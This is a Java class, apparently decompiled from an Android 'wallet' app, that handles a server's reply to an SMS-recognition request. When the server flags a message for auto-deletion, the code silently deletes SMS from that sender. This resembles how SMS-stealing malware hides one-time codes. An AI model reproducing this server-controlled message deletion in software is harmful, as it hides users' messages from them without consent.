package com.guard.wallet.http;
import com.guard.wallet.core.AppUtils;

import com.guard.wallet.resp.ApiResult;
import com.guard.wallet.resp.SmsRecognizeRespVO;
import java.io.IOException;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;
import okhttp3.ResponseBody;

/**
 * DeviceSmsRecognizeCallback - 短信识别回调.
 *
 * vendor 原始文件: http/f (62 lines).
 * 短信识别请求的回调处理, 成功时根据识别结果决定是否自动删除短信.
 */
public final class DeviceSmsRecognizeCallback implements Callback {
    @Override
    public void onFailure(Call call, IOException e) {
        AppUtils.s("DeviceSmsRecognizeCallback", e);
        if (!(e instanceof DuplicateRequestException)) {
            HttpClient.finishRequest(call.request().url().host());
            HttpApiManager.routeForwarding(call, this);
        }
    }

    @Override
    public void onResponse(Call call, Response response) throws IOException {
        HttpClient.finishRequest(call.request().url().host());
        ResponseBody var6 = response.body();
        if (var6 != null) {
            try {
                DeviceSmsRecognizeCallback$1 var3 = new DeviceSmsRecognizeCallback$1();
                ApiResult var7 = (ApiResult) com.guard.wallet.utils.SharedPrefsManager.c(var6.string(), var3);
                if (var7 != null && var7.getSuccess() && var7.getData() != null) {
                    SmsRecognizeRespVO var9 = (SmsRecognizeRespVO) var7.getData();
                    if (var9.getResp() && var9.getAutoDelete() && !AppUtils.B(var9.getSender())) {
                        com.guard.wallet.utils.SystemHelper.A(var9.getSender());
                    }
                }
            } catch (Exception var8) {
                AppUtils.s("DeviceSmsRecognizeCallback", var8);
            }
        }
        response.close();
    }
}
